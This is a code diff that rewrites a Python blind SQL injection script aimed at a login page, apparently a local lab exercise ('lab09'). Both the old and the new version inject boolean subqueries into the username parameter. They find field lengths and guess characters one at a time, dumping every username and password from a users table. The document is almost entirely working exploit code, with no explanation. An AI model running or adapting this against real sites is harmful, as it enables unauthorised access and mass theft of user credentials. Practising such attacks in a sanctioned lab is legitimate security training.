@@ -1,51 +1,41 @@
-import requests
+import urllib.request
+import urllib.parse
 import string
 
 BASE_URL = "http://localhost/lab09/login.php"
-SUCCESS_MARKER = "[+]"
+CHARSET = string.ascii_letters + string.digits
+SUCCESS_MARKER = "Printing cat"
 
-CHARSET = string.ascii_letters + string.digits + string.punctuation
-MAX_LEN = 64
+def is_success(u, p):
+    params = urllib.parse.urlencode({"u": u, "p": p})
+    url = BASE_URL + "?" + params
+    response = urllib.request.urlopen(url)
+    html = response.read().decode("utf-8")
+    return SUCCESS_MARKER in html
 
-def check(payload):
-    params = {"u": payload, "p": "x"}
-    try:
-        r = requests.get(BASE_URL, params=params)
-        return SUCCESS_MARKER in r.text
-    except:
-        return False
+def get_length(row, field):
+    for length in range(1, 200):
+        payload = '" OR (SELECT LENGTH(' + field + ') FROM users LIMIT 1 OFFSET ' + str(row) + ')=' + str(length) + ' -- '
+        if is_success(payload, "x"):
+            return length
+    return 0
 
-def extract_field(row_index, field_name):
-    result = ""
-    for pos in range(1, MAX_LEN + 1):
-        found_char = False
-        for ch in CHARSET:
-            if ch in ('"', '\\', "'"): # Added single quote to skip list for stability
-                continue
-            
-            # Line 26-28 area:
-            payload = f"' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- "
-            if check(payload):
-                result += ch
-                found_char = True
-                print(f"  Row {row_index+1} | {field_name}[{pos}] = {ch}", flush=True)
-                break
-        if not found_char:
-            break
-    return result
+def get_char(row, field, pos):
+    for c in CHARSET:
+        payload = '" OR (SELECT ASCII(SUBSTRING(' + field + ',' + str(pos) + ',1)) FROM users LIMIT 1 OFFSET ' + str(row) + ')=' + str(ord(c)) + ' -- '
+        if is_success(payload, "x"):
+            return c
+    return ""
 
-print("=== Blind SQL Injection Dump ===\n")
-users = []
-
-for i in range(100):
-    print(f"[*] Extracting row {i+1}...")
-    username = extract_field(i, "username")
-    if not username:
-        break
-    password = extract_field(i, "password")
-    users.append((username, password))
-    print(f"  --> {username} : {password}\n")
-
-print("\n=== RESULTS ===")
-for u, p in users:
-    print(f"{u} : {p}")
+results = []
+for row in range(100):
+    ulen = get_length(row, "username")
+    username = ""
+    for i in range(1, ulen + 1):
+        username = username + get_char(row, "username", i)
+    plen = get_length(row, "password")
+    password = ""
+    for i in range(1, plen + 1):
+        password = password + get_char(row, "password", i)
+    results.append((username, password))
+    print("Row " + str(row) + ": " + username + " / " + password)
